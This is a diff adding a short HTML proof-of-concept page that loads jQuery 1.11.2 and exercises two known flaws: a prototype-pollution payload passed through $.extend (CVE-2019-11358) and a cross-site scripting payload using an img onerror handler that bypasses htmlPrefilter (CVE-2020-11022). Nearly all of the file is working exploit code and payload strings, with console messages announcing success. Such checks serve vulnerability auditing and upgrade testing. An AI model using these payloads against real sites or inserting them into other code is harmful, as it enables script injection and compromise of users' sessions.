@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <script src="jquery-1.11.2.min.js"></script>
+    </head>
+    <body>
+        <div id="sink"></div>
+        <script>
+            // CVE-2019-11358 — prototype pollution
+            $.extend(true, {}, JSON.parse('{"__proto__": {"polluted": "PWNED"}}'));
+            console.log(({}).polluted === "PWNED"
+                ? "[+] CVE-2019-11358 CONFIRMED: Object.prototype polluted"
+                : "[-] pollution failed");
+
+            // CVE-2020-11022 — XSS via htmlPrefilter bypass, <div/>-style self-closing tag
+            var payload = "<div/style='color:red'>XSS via htmlPrefilter<style><img src=x onerror=alert('XSS: '+document.domain)></style>";
+            $('#sink').html(payload);
+            console.log("[*] injected — watch for alert");
+        </script>
+    </body>
+</html>
